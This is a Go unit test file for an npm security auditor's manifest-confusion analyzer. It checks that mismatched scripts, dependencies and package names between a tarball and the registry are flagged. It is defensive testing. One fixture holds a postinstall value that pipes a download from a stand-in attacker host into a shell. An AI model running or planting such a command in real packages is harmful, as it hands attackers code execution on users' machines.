package analyzer

import (
	"context"
	"testing"

	"github.com/kluth/npm-security-auditter/internal/registry"
)

func TestManifestConfusionAnalyzer_Name(t *testing.T) {
	a := NewManifestConfusionAnalyzer()
	if a.Name() != "manifest-confusion" {
		t.Errorf("expected name 'manifest-confusion', got %q", a.Name())
	}
}

func TestManifestConfusionAnalyzer_DifferentScripts(t *testing.T) {
	a := NewManifestConfusionAnalyzer()

	// Simulate tarball having postinstall script not in registry manifest
	findings, err := a.AnalyzeManifest(
		map[string]string{"test": "jest", "postinstall": "curl evil.com | sh"},
		map[string]string{"test": "jest"},
		map[string]string{},
		map[string]string{},
		"test-pkg",
		"test-pkg",
	)
	if err != nil {
		t.Fatal(err)
	}

	found := false
	for _, f := range findings {
		if f.Severity == SeverityCritical {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected CRITICAL finding for hidden postinstall script in tarball")
	}
}

func TestManifestConfusionAnalyzer_DifferentDependencies(t *testing.T) {
	a := NewManifestConfusionAnalyzer()

	findings, err := a.AnalyzeManifest(
		map[string]string{},
		map[string]string{},
		map[string]string{"lodash": "^4.0.0", "evil-pkg": "^1.0.0"},
		map[string]string{"lodash": "^4.0.0"},
		"test-pkg",
		"test-pkg",
	)
	if err != nil {
		t.Fatal(err)
	}

	found := false
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected HIGH+ finding for hidden dependency")
	}
}

func TestManifestConfusionAnalyzer_NameMismatch(t *testing.T) {
	a := NewManifestConfusionAnalyzer()

	findings, err := a.AnalyzeManifest(
		map[string]string{},
		map[string]string{},
		map[string]string{},
		map[string]string{},
		"evil-pkg",  // tarball name
		"legit-pkg", // registry name
	)
	if err != nil {
		t.Fatal(err)
	}

	found := false
	for _, f := range findings {
		if f.Severity == SeverityCritical {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected CRITICAL finding for package name mismatch")
	}
}

func TestManifestConfusionAnalyzer_ScriptModified(t *testing.T) {
	a := NewManifestConfusionAnalyzer()

	// Same script name but different content
	findings, err := a.AnalyzeManifest(
		map[string]string{"postinstall": "node malware.js"},
		map[string]string{"postinstall": "node setup.js"},
		map[string]string{},
		map[string]string{},
		"test-pkg",
		"test-pkg",
	)
	if err != nil {
		t.Fatal(err)
	}

	found := false
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected HIGH+ finding for modified install script content")
	}
}

func TestManifestConfusionAnalyzer_NoDifference(t *testing.T) {
	a := NewManifestConfusionAnalyzer()

	findings, err := a.AnalyzeManifest(
		map[string]string{"test": "jest"},
		map[string]string{"test": "jest"},
		map[string]string{"lodash": "^4.0.0"},
		map[string]string{"lodash": "^4.0.0"},
		"test-pkg",
		"test-pkg",
	)
	if err != nil {
		t.Fatal(err)
	}

	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity finding when manifests match: %s", f.Title)
		}
	}
}

func TestManifestConfusionAnalyzer_FullAnalyze(t *testing.T) {
	a := NewManifestConfusionAnalyzer()
	ctx := context.Background()
	pkg := &registry.PackageMetadata{Name: "test-pkg"}
	version := &registry.PackageVersion{
		Name:    "test-pkg",
		Version: "1.0.0",
	}

	// Should not error when no tarball is available (graceful degradation)
	findings, err := a.Analyze(ctx, pkg, version)
	if err != nil {
		t.Fatalf("Unexpected error: %v", err)
	}
	// Without tarball comparison data, there should be no findings
	_ = findings
}
